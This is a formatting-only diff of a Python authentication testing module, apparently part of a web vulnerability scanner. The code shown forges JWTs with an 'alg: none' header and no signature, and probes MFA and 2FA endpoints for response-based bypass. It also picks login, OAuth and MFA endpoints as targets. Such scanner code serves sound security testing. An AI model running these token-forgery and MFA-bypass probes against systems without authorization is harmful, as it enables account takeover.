@@ -14,9 +14,7 @@ class JWTTester:
     """Test JWT tokens for algorithm none, weak secrets, and header manipulation."""
 
     @staticmethod
-    async def test_alg_none(
-        token: str, endpoint: str, base_url: str = ""
-    ) -> dict[str, Any]:
+    async def test_alg_none(token: str, endpoint: str, base_url: str = "") -> dict[str, Any]:
         """Test JWT 'alg: none' algorithm injection."""
         try:
             parts = token.split(".")
@@ -26,9 +24,7 @@ class JWTTester:
             # Modify header to alg: none
             header = json.loads(base64.b64decode(parts[0] + "=="))
             header["alg"] = "none"
-            new_header = (
-                base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
-            )
+            new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
 
             # Remove signature
             manipulated_token = f"{new_header}.{parts[1]}."
@@ -94,9 +90,7 @@ class MFABypassTester:
     """Test MFA bypass via response manipulation."""
 
     @staticmethod
-    async def test_mfa_bypass(
-        endpoint: str, base_url: str = "", token: str = ""
-    ) -> dict[str, Any]:
+    async def test_mfa_bypass(endpoint: str, base_url: str = "", token: str = "") -> dict[str, Any]:
         """Test if MFA can be bypassed by modifying response."""
         try:
             headers = {"Authorization": f"Bearer {token}"} if token else {}
@@ -109,16 +103,12 @@ class MFABypassTester:
                 )
 
                 response_json = (
-                    response.json()
-                    if "application/json" in response.headers.get("Content-Type", "")
-                    else {}
+                    response.json() if "application/json" in response.headers.get("Content-Type", "") else {}
                 )
 
                 # Check if response can be manipulated
                 if response_json.get("success") or response.status_code == 200:
-                    if "mfa" not in str(response_json).lower() or response_json.get(
-                        "bypassed"
-                    ):
+                    if "mfa" not in str(response_json).lower() or response_json.get("bypassed"):
                         return {
                             "vulnerable": True,
                             "type": "mfa_bypass",
@@ -152,10 +142,7 @@ async def analyze_auth_session(
     # JWT testing
     if "jwt" in tech_str and token:
         jwt_endpoints = [
-            e
-            for e in endpoints
-            if "login" in e.get("path", "").lower()
-            or "auth" in e.get("path", "").lower()
+            e for e in endpoints if "login" in e.get("path", "").lower() or "auth" in e.get("path", "").lower()
         ]
 
         for ep in jwt_endpoints:
@@ -200,20 +187,14 @@ async def analyze_auth_session(
                 ],
             }
             for e in endpoints
-            if "oauth" in e.get("path", "").lower()
-            or "authorize" in e.get("path", "").lower()
+            if "oauth" in e.get("path", "").lower() or "authorize" in e.get("path", "").lower()
         ]
 
     # MFA bypass testing
     if token and base_url:
         for ep in endpoints:
-            if (
-                "mfa" in ep.get("path", "").lower()
-                or "2fa" in ep.get("path", "").lower()
-            ):
-                mfa_result = await MFABypassTester.test_mfa_bypass(
-                    ep.get("path", "/mfa/verify"), base_url, token
-                )
+            if "mfa" in ep.get("path", "").lower() or "2fa" in ep.get("path", "").lower():
+                mfa_result = await MFABypassTester.test_mfa_bypass(ep.get("path", "/mfa/verify"), base_url, token)
                 if mfa_result.get("vulnerable"):
                     findings["weak_auth"].append(mfa_result)
 
